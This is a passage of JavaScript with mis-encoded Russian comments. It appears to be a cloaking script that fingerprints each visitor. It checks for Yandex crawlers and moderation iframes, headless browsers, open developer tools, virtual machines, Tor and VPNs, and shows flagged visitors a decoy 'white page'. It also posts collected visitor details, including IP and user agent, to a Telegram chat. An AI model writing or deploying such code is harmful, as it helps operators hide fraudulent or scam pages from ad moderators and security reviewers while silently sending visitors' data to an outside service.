                    return new Promise((resolve) => {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', url, true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.onload = () => resolve(xhr.status >= 200 && xhr.status < 300);
                        xhr.onerror = () => resolve(false);
                        xhr.send(JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown'
                        }));
                    });
                }
            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –æ—Ç—á–µ—Ç–∞ –≤ Telegram:", error);
                return false;
            }
        }

        // ===== –§–£–ù–ö–¶–ò–ò –ü–†–û–í–ï–†–û–ö –ë–û–¢–û–í/–ú–û–î–ï–†–ê–¢–û–†–û–í =====

        /**
         * –ü—Ä–æ–≤–µ—Ä–∫–∞, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ª–µ–≥–∏—Ç–∏–º–Ω—ã–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º –Ø–Ω–¥–µ–∫—Å.–ë—Ä–∞—É–∑–µ—Ä–∞ –∏–ª–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
         */
        function isRegularYandexUser() {
            const ua = navigator.userAgent;
            return YANDEX_REGULAR_APPS.some(pattern => pattern.test(ua));
        }

        /**
         * –ü—Ä–æ–≤–µ—Ä–∫–∞, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ User-Agent –±–æ—Ç–æ–º (—Å –∏—Å–∫–ª—é—á–µ–Ω–∏–µ–º –æ–±—ã—á–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –Ø–Ω–¥–µ–∫—Å–∞)
         */
        function isSearchBot() {
            // –ï—Å–ª–∏ —ç—Ç–æ –æ–±—ã—á–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ø–Ω–¥–µ–∫—Å.–ë—Ä–∞—É–∑–µ—Ä–∞ –∏–ª–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –Ω–µ —Å—á–∏—Ç–∞–µ–º –µ–≥–æ –±–æ—Ç–æ–º
            if (isRegularYandexUser()) {
                return false;
            }
            
            const ua = navigator.userAgent;
            return SEARCH_BOT_AGENTS.some(pattern => pattern.test(ua));
        }

        /**
         * –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏–∑–Ω–∞–∫–æ–≤ headless-–±—Ä–∞—É–∑–µ—Ä–∞
         */
        function isHeadlessBrowser() {
            // –ï—Å–ª–∏ —ç—Ç–æ –æ–±—ã—á–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ø–Ω–¥–µ–∫—Å.–ë—Ä–∞—É–∑–µ—Ä–∞ –∏–ª–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –Ω–µ –≤—ã–ø–æ–ª–Ω—è–µ–º —ç—Ç—É –ø—Ä–æ–≤–µ—Ä–∫—É
            if (isRegularYandexUser()) {
                return false;
            }
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ WebDriver
            if (navigator.webdriver) return true;
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è –æ–±—ä–µ–∫—Ç–æ–≤ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏–∏
            if (window.domAutomation || window.domAutomationController) return true;
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ Phantom JS
            if (window._phantom || window.callPhantom) return true;
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ Selenium
            if (document.documentElement.getAttribute('webdriver') || 
                document.documentElement.getAttribute('selenium') || 
                document.documentElement.getAttribute('driver')) {
                return true;
            }
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ Puppeteer/Playwright
            if (navigator.userAgent.includes('HeadlessChrome')) return true;
            
            // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–∞ –æ—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏ headless –±—Ä–∞—É–∑–µ—Ä–æ–≤
            try {
                // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–ª–∞–≥–∏–Ω–æ–≤ (headless –æ–±—ã—á–Ω–æ –∏–º–µ–µ—Ç 0 –ø–ª–∞–≥–∏–Ω–æ–≤)
                if (navigator.plugins.length === 0 && !isMobile) {
                    // –£ –Ø–Ω–¥–µ–∫—Å –ë—Ä–∞—É–∑–µ—Ä–∞ –∏ –¥—Ä—É–≥–∏—Ö –º–æ–≥—É—Ç –±—ã—Ç—å —Å–≤–æ–∏ –æ—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏ —Å –ø–ª–∞–≥–∏–Ω–∞–º–∏
                    const ua = navigator.userAgent.toLowerCase();
                    if (!ua.includes('yabrowser') && !ua.includes('yandex') && !ua.includes('dzen')) {
                        return true;
                    }
                }
                
                // –ü—Ä–æ–≤–µ—Ä–∫–∞ —è–∑—ã–∫–æ–≤ (headless –æ–±—ã—á–Ω–æ –∏–º–µ–µ—Ç –ø—É—Å—Ç–æ–π —Å–ø–∏—Å–æ–∫)
                if (navigator.languages.length === 0) return true;
            } catch (e) {
                // –ï—Å–ª–∏ –≤–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø–µ –∫ —Å–≤–æ–π—Å—Ç–≤–∞–º, —ç—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—Ä–∏–∑–Ω–∞–∫–æ–º —ç–º—É–ª—è—Ü–∏–∏
                return true;
            }
            
            return false;
        }

        /**
         * –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è iframe –º–æ–¥–µ—Ä–∞—Ü–∏–∏ –Ø–Ω–¥–µ–∫—Å–∞
         */
        function hasYandexModeratorIframe() {
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–µ–∫—É—â–∏—Ö iframe
            const iframes = document.querySelectorAll('iframe');
            for (const iframe of iframes) {
                const src = iframe.src || '';
                if (src.includes('iframe-yang.yandex') || 
                    src.includes('yandex.ru/iframe/mod') || 
                    src.includes('webvisor.com/mod') ||
                    src.includes('yandex.ru/moderation')) {
                    return true;
                }
            }
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã—Ö JS-–æ–±—ä–µ–∫—Ç–æ–≤ –º–æ–¥–µ—Ä–∞—Ü–∏–∏ –Ø–Ω–¥–µ–∫—Å–∞
            if (typeof window.YaModerator !== 'undefined' || 
                typeof window.YaModeration !== 'undefined') {
                return true;
            }
            
            return false;
        }

        /**
         * –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –Ω–∞–±–ª—é–¥–∞—Ç–µ–ª—è –∑–∞ DOM –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è iframe –º–æ–¥–µ—Ä–∞—Ü–∏–∏
         */
        function setupModerationFrameObserver() {
            try {
                const observer = new MutationObserver((mutations) => {
                    for (const mutation of mutations) {
                        if (mutation.type === 'childList') {
                            for (const node of mutation.addedNodes) {
                                if (node.tagName === 'IFRAME') {
                                    const src = node.src || '';
                                    if (src.includes('iframe-yang.yandex') || 
                                        src.includes('yandex.ru/iframe/mod') || 
                                        src.includes('webvisor.com/mod') ||
                                        src.includes('yandex.ru/moderation')) {
                                        botTrapActivated = true;
                                    }
                                }
                            }
                        }
                    }
                });
                
                observer.observe(document.body, { childList: true, subtree: true });
            } catch (e) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ –Ω–∞–±–ª—é–¥–∞—Ç–µ–ª—è –∑–∞ iframe:", e);
            }
        }

        /**
         * –ö–æ–º–ø–ª–µ–∫—Å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –±–æ—Ç–∞ –Ø–Ω–¥–µ–∫—Å–∞ (—Å –∏—Å–∫–ª—é—á–µ–Ω–∏–µ–º –æ–±—ã—á–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π)
         */
        async function isYandexBot() {
            // –ï—Å–ª–∏ —ç—Ç–æ –æ–±—ã—á–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ø–Ω–¥–µ–∫—Å.–ë—Ä–∞—É–∑–µ—Ä–∞ –∏–ª–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –Ω–µ —Å—á–∏—Ç–∞–µ–º –µ–≥–æ –±–æ—Ç–æ–º
            if (isRegularYandexUser()) {
                return false;
            }
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ User-Agent –Ω–∞ –Ω–∞–ª–∏—á–∏–µ —è–≤–Ω—ã—Ö –ø—Ä–∏–∑–Ω–∞–∫–æ–≤ –±–æ—Ç–∞ (–Ω–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è)
            const ua = navigator.userAgent;
            const strictYandexBotPattern = /YandexBot|YandexAccessibilityBot|YandexMobileBot|YandexDirectDyn|YandexImages|YandexVideo|YandexVideoParser|YandexMedia|YandexBlogs|YandexFavicons|YandexWebmaster|YandexPagechecker|YandexImageResizer|YaDirectFetcher|YandexCalendar|YandexSitelinks|YandexMetrika|YandexNews|YandexCatalog|YandexMarket|YandexVerticals|YandexVertis|YandexSearchShop|YandexOntoDB|YandexOntoDBAPI|YandexRCA|YandexSpravBot|YandexScreenshotBot|YandexMobileScreenShotBot|YandexAdNet|YandexDirect|YandexTurbo|YandexRenderResourcesBot|YandexTracker|YandexPartner|YandexComBot|MirrorDetector/i;
            
            if (strictYandexBotPattern.test(ua)) return true;
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ iframe –º–æ–¥–µ—Ä–∞—Ü–∏–∏
            if (hasYandexModeratorIframe()) return true;
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–∏–∞–ø–∞–∑–æ–Ω–æ–≤ IP –Ø–Ω–¥–µ–∫—Å–∞ (—Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ —ç—Ç–æ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –ø–æ—Ö–æ–∂–µ –Ω–∞ –±–æ—Ç–∞)
            if ((/bot|crawler|spider/i.test(ua))) {
                try {
                    const ip = await getIpAddress();
                    if (!ip || ip === "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ") return false;
                    
                    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç –ª–∏ IP –Ø–Ω–¥–µ–∫—Å—É —á–µ—Ä–µ–∑ DNS lookup
                    try {
                        const response = await fetch(`https://dns.google/resolve?name=${ip.split('.').reverse().join('.')}.in-addr.arpa&type=PTR`);
                        if (response.ok) {
                            const data = await response.json();
                            if (data.Answer && data.Answer.length > 0) {
                                const ptr = data.Answer[0].data;
                                return YANDEX_DOMAINS.some(domain => ptr.includes(domain));
                            }
                        }
                    } catch (e) {
                        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ DNS:", e);
                    }
                    
                    // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ —Å–µ—Ä–≤–∏—Å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ –ø–æ IP
                    try {
                        const orgResponse = await fetch(`https://ipapi.co/${ip}/org/`);
                        if (orgResponse.ok) {
                            const org = await orgResponse.text();
                            return org.toLowerCase().includes('yandex');
                        }
                    } catch (e) {
                        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ IP:", e);
                    }
                } catch (e) {
                    console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ IP –Ø–Ω–¥–µ–∫—Å–∞:", e);
                }
            }
            
            return false;
        }

        /**
         * –ü—Ä–æ–≤–µ—Ä–∫–∞, –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –ª–∏ IP –≤ —á–µ—Ä–Ω–æ–º —Å–ø–∏—Å–∫–µ
         */
        async function isIpBlocked() {
            try {
                const ipAddress = await getIpAddress();
                if (!ipAddress || ipAddress === "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ") return false;
                
                const blacklist = await loadFile('blckip.txt');
                if (!blacklist) return false;
                
                const blockedIps = blacklist.split('\n').map(ip => ip.trim()).filter(ip => ip);
                return blockedIps.includes(ipAddress);
            } catch (e) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ —á–µ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞ IP:", e);
                return false;
            }
        }

        /**
         * –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏–∑–Ω–∞–∫–æ–≤ –º–æ–¥–µ—Ä–∞—Ç–æ—Ä–∞ –∏–ª–∏ —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞
         */
        function isLikelyModerator() {
            // –ï—Å–ª–∏ —ç—Ç–æ –æ–±—ã—á–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ø–Ω–¥–µ–∫—Å.–ë—Ä–∞—É–∑–µ—Ä–∞ –∏–ª–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, —Å–Ω–∏–∂–∞–µ–º —Å—Ç—Ä–æ–≥–æ—Å—Ç—å –ø—Ä–æ–≤–µ—Ä–∫–∏
            const isYandexRegularUser = isRegularYandexUser();
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ DevTools –ø–æ —Ä–∞–∑–º–µ—Ä—É –æ–∫–Ω–∞ (–±–æ–ª–µ–µ –º—è–≥–∫–∏–µ –∫—Ä–∏—Ç–µ—Ä–∏–∏ –¥–ª—è –Ø–Ω–¥–µ–∫—Å.–ë—Ä–∞—É–∑–µ—Ä–∞)
            const minWidthDiff = isYandexRegularUser ? 150 : 100;
            const minHeightDiff = isYandexRegularUser ? 150 : 100;
            
            if (window.outerWidth - window.innerWidth > minWidthDiff || 
                window.outerHeight - window.innerHeight > minHeightDiff) {
                return true;
            }
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ WebDriver
            if (navigator.webdriver) return true;
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è –¥–ª—è —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤
            if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined' || 
                typeof __REDUX_DEVTOOLS_EXTENSION__ !== 'undefined') {
                return true;
            }
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—Ä–µ–º–µ–Ω–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è console.log (timing attack –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –æ—Ç–∫—Ä—ã—Ç–æ–π –∫–æ–Ω—Å–æ–ª–∏)
            let slowConsole = false;
            
            // –î–ª—è –Ø–Ω–¥–µ–∫—Å.–ë—Ä–∞—É–∑–µ—Ä–∞ –ø—Ä–æ–ø—É—Å–∫–∞–µ–º —ç—Ç—É –ø—Ä–æ–≤–µ—Ä–∫—É –∏–ª–∏ –¥–µ–ª–∞–µ–º –µ–µ –±–æ–ª–µ–µ –º—è–≥–∫–æ–π
            if (!isYandexRegularUser) {
                const start = performance.now();
                console.log('');
                console.clear();
                const end = performance.now();
                // –ï—Å–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∑–∞–Ω—è–ª–æ –±–æ–ª–µ–µ 5–º—Å, –≤–æ–∑–º–æ–∂–Ω–æ –∫–æ–Ω—Å–æ–ª—å –æ—Ç–∫—Ä—ã—Ç–∞
                if (end - start > 5) {
                    slowConsole = true;
                }
            }
            
            return slowConsole;
        }

        // ===== –≠–ö–°–ü–ï–†–ò–ú–ï–ù–¢–ê–õ–¨–ù–´–ï –ü–†–û–í–ï–†–ö–ò =====

        /**
         * –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –±–ª–æ–∫–∏—Ä–æ–≤—â–∏–∫–∞ —Ä–µ–∫–ª–∞–º—ã
         */
        function detectAdblocker() {
            if (!config.experimental.CheckAdBlocker) return false;
            
            try {
                // –°–æ–∑–¥–∞–µ–º —Ç–µ—Å—Ç–æ–≤—ã–π —ç–ª–µ–º–µ–Ω—Ç, –∫–æ—Ç–æ—Ä—ã–π –±–ª–æ–∫–∏—Ä–æ–≤—â–∏–∫–∏ –æ–±—ã—á–Ω–æ —Å–∫—Ä—ã–≤–∞—é—Ç
                const testAd = document.createElement('div');
                testAd.innerHTML = '¬†';
                testAd.className = 'adsbox';
                document.body.appendChild(testAd);
                
                // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å–∫—Ä—ã—Ç –ª–∏ —ç–ª–µ–º–µ–Ω—Ç
                const isBlocked = testAd.offsetHeight === 0;
                document.body.removeChild(testAd);
                return isBlocked;
            } catch (e) {
                return false;
            }
        }

        /**
         * –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–π –º–∞—à–∏–Ω—ã
         */
        function checkForVirtualMachine() {
            if (!config.experimental.CheckVirtualMachine) return false;
            
            // –ï—Å–ª–∏ —ç—Ç–æ –æ–±—ã—á–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ø–Ω–¥–µ–∫—Å.–ë—Ä–∞—É–∑–µ—Ä–∞, –ø—Ä–æ–ø—É—Å–∫–∞–µ–º —ç—Ç—É –ø—Ä–æ–≤–µ—Ä–∫—É
            if (isRegularYandexUser()) return false;
            
            // –í–∏—Ä—Ç—É–∞–ª—å–Ω—ã–µ –º–∞—à–∏–Ω—ã —á–∞—Å—Ç–æ –∏–º–µ—é—Ç –Ω–∏–∑–∫–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —è–¥–µ—Ä –∏ –ø–∞–º—è—Ç—å
            if (navigator.hardwareConcurrency <= 1) return true;
            if (navigator.deviceMemory && navigator.deviceMemory <= 1) return true;
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã—Ö –ø–∞—Ç—Ç–µ—Ä–Ω–æ–≤ –≤ User-Agent
            const ua = navigator.userAgent;
            if (ua.includes('VMware') || ua.includes('VirtualBox')) return true;
            
            return false;
        }

        /**
         * –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å–µ—Ç–∏ Tor
         */
        async function checkTorNetwork() {
            if (!config.experimental.CheckTorNetwork) return false;
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ –≤–Ω–µ—à–Ω–∏–π —Å–µ—Ä–≤–∏—Å
            try {
                const response = await fetch('https://check.torproject.org/api/ip');
                if (response.ok) {
                    const data = await response.json();
                    return data.IsTor === true;
                }
            } catch (e) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ Tor:", e);
            }
            
            // –†–µ–∑–µ—Ä–≤–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ –ø—Ä–∏–∑–Ω–∞–∫–∞–º –±—Ä–∞—É–∑–µ—Ä–∞ Tor
            const ua = navigator.userAgent;
            if (ua.includes('Tor') || navigator.plugins.length === 0 && 
                window.screen.width === 1000 && window.screen.height === 1000) {
                return true;
            }
            
            return false;
        }

        /**
         * –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø—Ä–æ–∫—Å–∏ –∏–ª–∏ VPN
         */
        async function detectProxiesOrVPN() {
            if (!config.experimental.CheckVPN) return false;
            
            try {
                // –ó–∞–ø—Ä–æ—Å –∫ —Å–µ—Ä–≤–∏—Å—É –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –ø—Ä–æ–∫—Å–∏
                const ip = await getIpAddress();
                if (!ip || ip === "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ") return false;
                
                const response = await fetch(`https://ipqualityscore.com/api/json/ip/${ip}?strictness=0&lightweight=true&mobile=true`);
                if (response.ok) {
                    const data = await response.json();
                    return data.proxy || data.vpn || data.tor;
                }
            } catch (e) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –ø—Ä–æ–∫—Å–∏/VPN:", e);
            }
            
            return false;
        }

        /**
         * –ü—Ä–æ–≤–µ—Ä–∫–∞ WebRTC –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è VPN
         */
        async function checkWebRTCLeakage() {
            if (!config.experimental.CheckWebRTCLeakage) return false;
            
            // –î–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ä–∞—Å—Ö–æ–∂–¥–µ–Ω–∏–π –º–µ–∂–¥—É –ø—É–±–ª–∏—á–Ω—ã–º IP –∏ –ª–æ–∫–∞–ª—å–Ω—ã–º IP —á–µ—Ä–µ–∑ WebRTC
            return new Promise((resolve) => {
                try {
                    // –ü–æ–ª—É—á–∞–µ–º –ª–æ–∫–∞–ª—å–Ω—ã–µ IP-–∞–¥—Ä–µ—Å–∞ —á–µ—Ä–µ–∑ WebRTC
                    const pc = new RTCPeerConnection({
                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                    });
                    
                    pc.createDataChannel('');
                    pc.onicecandidate = (ice) => {
                        if (!ice.candidate) {
                            pc.close();
                            resolve(false);
                            return;
                        }
                        
                        const localIp = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                        if (localIp && localIp.length > 1) {
                            getIpAddress().then(publicIp => {
                                // –ï—Å–ª–∏ –ª–æ–∫–∞–ª—å–Ω—ã–π –∏ –ø—É–±–ª–∏—á–Ω—ã–π IP —Ä–∞–∑–Ω—ã–µ, –≤–æ–∑–º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è VPN
                                resolve(localIp[1] !== publicIp && !localIp[1].startsWith('192.168.') && !localIp[1].startsWith('10.'));
                            });
                        } else {
                            resolve(false);
                        }
                    };
                    
                    pc.createOffer()
                        .then(offer => pc.setLocalDescription(offer))
                        .catch(() => resolve(false));
                        
                    // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∞–π–º–∞—É—Ç –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏
                    setTimeout(() => {
                        pc.close();
                        resolve(false);
                    }, 2000);
                } catch (e) {
                    resolve(false);
                }
            });
        }

        /**
         * –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Ç–∞–π–º–∏–Ω–≥-–∞—Ç–∞–∫ –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –æ—Ç–ª–∞–¥—á–∏–∫–∞
         */
        function performTimingAttacks() {
            if (!config.experimental.PerformTimingAttacks) return false;
            
            // –ï—Å–ª–∏ —ç—Ç–æ –æ–±—ã—á–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ø–Ω–¥–µ–∫—Å.–ë—Ä–∞—É–∑–µ—Ä–∞, –ø—Ä–æ–ø—É—Å–∫–∞–µ–º —ç—Ç—É –ø—Ä–æ–≤–µ—Ä–∫—É
            if (isRegularYandexUser()) return false;
            
            const start = performance.now();
            
            // –í—ã–ø–æ–ª–Ω—è–µ–º –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç—å –æ–ø–µ—Ä–∞—Ü–∏–π, –∫–æ—Ç–æ—Ä—ã–µ –∑–∞–º–µ–¥–ª—è—é—Ç—Å—è –ø—Ä–∏ –æ—Ç–ª–∞–¥–∫–µ
            for (let i = 0; i < 1000; i++) {
                console.debug('');
            }
            
            // –û—á–∏—â–∞–µ–º –∫–æ–Ω—Å–æ–ª—å
            console.clear();
            
            const end = performance.now();
            
            // –ï—Å–ª–∏ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –±–æ–ª—å—à–µ –ø–æ—Ä–æ–≥–æ–≤–æ–≥–æ, –≤–µ—Ä–æ—è—Ç–Ω–æ –≤–∫–ª—é—á–µ–Ω–∞ –æ—Ç–ª–∞–¥–∫–∞
            return end - start > 20;
        }

        /**
         * –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –∏—Ç–æ–≥–æ–≤–æ–≥–æ URL –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è
         */
        async function determineRedirectTarget() {
            try {
                // –ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
                const configText = await loadFile('config.txt');
                parseConfig(configText);
                
                // –ó–∞–≥—Ä—É–∑–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ onoff.txt –¥–ª—è —Ñ—É–Ω–∫—Ü–∏–∏ —á–∞—Å—Ç–æ—Ç—ã –ø–æ—Å–µ—â–µ–Ω–∏–π
                const onOffText = await loadFile('onoff.txt');
                let onOffState = onOffText ? onOffText.trim() : 'on';
                
                // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
                userInfo = await collectUserInfo();
                
                // –ü—Ä–∏–º–µ–Ω–µ–Ω–∏–µ –ø—Ä–æ–≤–µ—Ä–æ–∫ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ç–∏–ø–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
                const deviceConfig = isMobile ? config.mobile : config.desktop;
                
                // 1. –ü—Ä–æ–≤–µ—Ä–∫–∞ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –ª–æ–≤—É—à–∫–∏ –¥–ª—è –±–æ—Ç–æ–≤
                if (botTrapActivated) {
                    await sendTelegramReport("–ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞ –ª–æ–≤—É—à–∫–∞ –¥–ª—è –±–æ—Ç–æ–≤", userInfo);
                    return WHITE_PAGE;
                }
                
                // 2. –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –ø–æ–∏—Å–∫–æ–≤—ã—Ö –±–æ—Ç–æ–≤
                if (deviceConfig.CheckSearchBots && isSearchBot()) {
                    await sendTelegramReport("–û–±–Ω–∞—Ä—É–∂–µ–Ω –ø–æ–∏—Å–∫–æ–≤—ã–π –±–æ—Ç –ø–æ User-Agent", userInfo);
                    return WHITE_PAGE;
                }
                
                // 3. –ü—Ä–æ–≤–µ—Ä–∫–∞ headless –±—Ä–∞—É–∑–µ—Ä–∞
                if (deviceConfig.CheckHeadlessBrowser && isHeadlessBrowser()) {
                    await sendTelegramReport("–û–±–Ω–∞—Ä—É–∂–µ–Ω headless –±—Ä–∞—É–∑–µ—Ä", userInfo);
                    return WHITE_PAGE;
                }
                
                // 4. –ü—Ä–æ–≤–µ—Ä–∫–∞ –º–æ–¥–µ—Ä–∞—Ü–∏–∏ –Ø–Ω–¥–µ–∫—Å–∞
                if (deviceConfig.CheckYandexModerator && hasYandexModeratorIframe()) {
                    await sendTelegramReport("–û–±–Ω–∞—Ä—É–∂–µ–Ω iframe –º–æ–¥–µ—Ä–∞—Ü–∏–∏ –Ø–Ω–¥–µ–∫—Å–∞", userInfo);
                    return WHITE_PAGE;
                }
                
                // 5. –ö–æ–º–ø–ª–µ–∫—Å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –±–æ—Ç–æ–≤ –Ø–Ω–¥–µ–∫—Å–∞
                if (deviceConfig.CheckYandexBot && await isYandexBot()) {
                    await sendTelegramReport("–û–±–Ω–∞—Ä—É–∂–µ–Ω –±–æ—Ç –Ø–Ω–¥–µ–∫—Å–∞", userInfo);
                    return WHITE_PAGE;
                }
                
                // 6. –ü—Ä–æ–≤–µ—Ä–∫–∞ IP –≤ —á–µ—Ä–Ω–æ–º —Å–ø–∏—Å–∫–µ
                if (deviceConfig.CheckIpBlacklist && await isIpBlocked()) {
                    await sendTelegramReport("IP –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —á–µ—Ä–Ω–æ–º —Å–ø–∏—Å–∫–µ", userInfo);
                    return WHITE_PAGE;
                }
                
